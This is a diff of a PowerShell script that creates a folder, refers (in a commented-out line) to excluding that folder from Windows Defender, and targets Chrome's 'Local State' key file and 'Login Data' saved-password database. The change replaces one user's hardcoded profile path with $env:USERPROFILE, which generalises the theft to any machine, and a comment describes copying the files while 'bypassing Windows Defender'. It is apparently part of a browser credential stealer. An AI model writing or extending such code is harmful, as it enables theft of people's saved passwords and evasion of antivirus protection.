@@ -8,8 +8,8 @@ New-Item -ItemType Directory -Path $folderPath -Force
 #Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction Stop
 
 # Define the source paths
-$localStatePath = "C:\Users\wblac\AppData\Local\Google\Chrome\User Data\Local State"
-$loginDataPath = "C:\Users\wblac\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+$localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
+$loginDataPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 
 # Copy the folders to the destination without errors and bypassing Windows Defender
 try {
